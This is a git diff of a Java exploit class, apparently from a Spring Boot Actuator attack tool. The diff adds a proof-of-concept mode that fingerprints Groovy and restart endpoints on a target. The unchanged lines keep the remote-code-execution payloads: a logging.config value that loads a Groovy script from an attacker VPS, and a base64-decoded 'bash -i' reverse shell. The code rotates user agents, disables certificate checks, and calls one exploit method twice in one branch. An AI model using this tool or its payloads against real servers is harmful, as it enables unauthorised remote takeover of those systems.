@@ -19,6 +19,7 @@ public class LoggingGroovyRCE {
     private String address;
     private String vpsIP;
     private String vpsPORT;
+    private boolean isPoc;
     public String text;
     public String expdata1 = "logging.config=http://%s/LoggingConfigGR.groovy";
     public String expdata2 = "{\"name\":\"logging.config\",\"value\":\"http://%s/LoggingConfigGR.groovy\"}";
@@ -26,10 +27,11 @@ public class LoggingGroovyRCE {
     public String payload = "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");";
 
 
-    public LoggingGroovyRCE(String address, String vpsIP, String vpsPORT){
+    public LoggingGroovyRCE(String address, String vpsIP, String vpsPORT, boolean isPoc){
         this.address = address;
         this.vpsIP = vpsIP;
         this.vpsPORT = vpsPORT;
+        this.isPoc = isPoc;
     }
 
     public void Result1(ResultCallback callback){
@@ -221,6 +223,121 @@ public class LoggingGroovyRCE {
             e.printStackTrace();
         }
     }
+    public void Result3(ResultCallback callback){
+        String llib = "groovy";
+        String api = "/env";
+        String site = address + api;
+        String ua = "";
+        disableSSLVerification();
+        try {
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            conn.setDoOutput(true);
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
+                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = String.format("groovy 依赖为: %s", matcher.group(1));
+                    callback.onResult(text);
+                    URL obj1 = new URL(address + "/actuator");
+                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    conn1.setDoOutput(true);
+                    conn1.setRequestProperty("User-Agent", ua);
+                    conn1.setRequestMethod("GET");
+                    int responseCode1 = conn1.getResponseCode();
+                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                    String inputLine1;
+                    StringBuilder response1 = new StringBuilder();
+                    while ((inputLine1 = in1.readLine()) != null) {
+                        response1.append(inputLine1);
+                    }
+                    in1.close();
+                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
+                        text = "可能存在漏洞";
+                        callback.onResult(text);
+                    }else {
+                        text = "不存在可利用漏洞";
+                        callback.onResult(text);
+                    }
+                }
+            }
+        }catch (Exception e){
+            text = "检测依赖异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
+    public void Result4(ResultCallback callback){
+        String llib = "groovy";
+        String api = "/actuator/env";
+        String site = address + api;
+        String ua = "";
+        disableSSLVerification();
+        try {
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            URL obj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent", ua);
+            conn.setRequestMethod("GET");
+            conn.setDoOutput(true);
+            int responseCode = conn.getResponseCode();
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder response = new StringBuilder();
+            while ((inputLine = in.readLine()) != null) {
+                response.append(inputLine);
+            }
+            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
+                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
+                Pattern pattern = Pattern.compile(regex);
+                Matcher matcher = pattern.matcher(response.toString());
+                if (matcher.find()) {
+                    text = String.format("groovy 依赖为: %s", matcher.group(1));
+                    callback.onResult(text);
+                    URL obj1 = new URL(address + "/actuator");
+                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    conn1.setDoOutput(true);
+                    conn1.setRequestProperty("User-Agent", ua);
+                    conn1.setRequestMethod("GET");
+                    int responseCode1 = conn1.getResponseCode();
+                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
+                    String inputLine1;
+                    StringBuilder response1 = new StringBuilder();
+                    while ((inputLine1 = in1.readLine()) != null) {
+                        response1.append(inputLine1);
+                    }
+                    in1.close();
+                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
+                        text = "可能存在漏洞";
+                        callback.onResult(text);
+                    }else {
+                        text = "不存在可利用漏洞";
+                        callback.onResult(text);
+                    }
+                }
+            }
+        }catch (Exception e){
+            text = "检测依赖异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
+
     public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
@@ -238,10 +355,19 @@ public class LoggingGroovyRCE {
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 text = "当前版本为springboot2";
                 callback.onResult(text);
-                Result2(callback);
+                if (isPoc && vpsIP.isEmpty() && vpsPORT.isEmpty()){
+                    Result4(callback);
+                }else {
+                    Result2(callback);
+                }
             }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                 text = "当前版本为springboot1";
                 callback.onResult("当前版本为springboot1");
+                if (isPoc && vpsIP.isEmpty() && vpsPORT.isEmpty()){
+                    Result3(callback);
+                }else {
+                    Result1(callback);
+                }
                 Result1(callback);
             }else{
                 text = "未识别springboot版本";
